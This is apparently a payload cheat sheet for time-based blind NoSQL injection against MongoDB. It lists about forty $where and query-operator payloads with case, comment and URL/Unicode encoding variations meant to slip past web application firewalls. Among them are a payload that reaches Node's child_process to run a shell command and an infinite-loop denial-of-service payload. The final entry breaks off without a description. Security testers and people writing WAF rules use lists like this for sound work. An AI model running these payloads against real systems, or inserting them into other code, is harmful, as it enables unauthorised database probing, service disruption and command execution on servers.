# MongoDB

These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.

- **{"$where": "sleep(5000)"}**  
  Standard JS sleep 5 seconds.
- **;sleep(5000);**  
  Semicolon JS sleep.
- **{"$where": "function(){sleep(5000); return true;}"}**  
  Function-wrapped sleep.
- **{"$where": "this.username && sleep(5000)"}**  
  Conditional field sleep.
- **%7B%22%24where%22%3A%20%22sleep%285000%29%22%7D**  
  URL-encoded sleep.
- **\u007B"$where": "sleep(5000)"\u007D**  
  Unicode JSON sleep.
- **{"$where": "SlEeP(5000)"}**  
  Case variation sleep.
- **{"$where": /*comment*/"sleep(5000)"/*comment*/}**  
  JS inline comments.
- **{"$where": "sleep (5000)"}**  
  Spaced sleep.
- **{"$where": "sleep/**/(5000)"}**  
  Comment in function.
- **{"username": {"$ne": null}, "$where": "sleep(5000)"}**  
  Operator + sleep.
- **%257B%2522%2524where%2522%3A%20%2522sleep%285000%29%2522%257D**  
  Double URL sleep.
- **{"$where": "if(1==1){sleep(5000)}"}**  
  IF conditional sleep.
- **{"$or": [{"a": {"$ne": 1}}, {"$where": "sleep(5000)"}]}**  
  OR operator sleep.
- **';sleep(5000);'**  
  Trailing semicolon sleep.
- **{"$where": "this.constructor.constructor('return process')().mainModule.require('child_process').exec('sleep 5')"}**  
  Child process exec sleep.
- **{"$where": "function() { var x = 0; while (true) { x++; } }"}**  
  Infinite loop delay.
- **{"$where": "new Date().getTime() + 5000"}**  
  Time check loop.
- **{"$where": "sleep(5000) || 1"}**  
  OR logical sleep.
- **{"$where": "sleep(5000) && 1"}**  
  AND logical sleep.
- **%7B%22%24where%22%3A%22SlEeP%285000%29%22%7D**  
  Case + URL sleep.
- **{"$where": "sleep/* */(5000)"}**  
  Comment param sleep.
- **{"$where": "s l e e p (5000)"}**  
  Fully spaced sleep.
- **{"$where": "sleep(5000)#"}**  
  Hash comment sleep.
- **{"$where": "sleep(5000)--"}**  
  Dash comment sleep.
- **{"$where": "function(){var d=new Date();var c=d.getTime()+5000;while(d.getTime()<c){d=new Date();}return true;}"}**  
  While loop time delay.
- **{"a": {"$in": [/.*/]}, "$where": "sleep(5000)"}**  
  Regex IN + sleep.
- **\u007B\u0022\u0024where\u0022\u003A \u0022sleep\u00285000\u0029\u0022\u007D**  
  Full Unicode sleep.
- **{"$where": "sleep(10000)"}**  
  Longer 10-second sleep.
- **{"$where": "this.password.match(/.*/)&&sleep(5000)"}**  
  Regex match + sleep.
- **;return sleep(5000);**  
  Return sleep.
- **{"$where": "1 == 1 && sleep(5000)"}**  
  Condition && sleep.
- **%7B%22%24where%22%3A%221%20%3D%3D%201%20%26%26%20sleep%285000%29%22%7D**  
  URL condition sleep.
- **{"$where": "sleep(5000) or 1==1"}**  
  OR condition sleep.
- **{"$where": "sleep(5000) and 1==1"}**  
  AND condition sleep.
- **{"$where": "sleep(5000);true;"}**  
  Chained statement sleep.
- **{"$where": "true; sleep(5000);"}**  
  Preceded sleep.
- **{"$where": "sleep(5000)/*comment*/"}**  
  JS comment sleep.
- **{"$where": "sleep(5000)//"}**  
  Line comment sleep.
- **%25257B%252522%252524where%252522%25253A%252520%252522sleep%2525285000%252529%252522%25257D**  
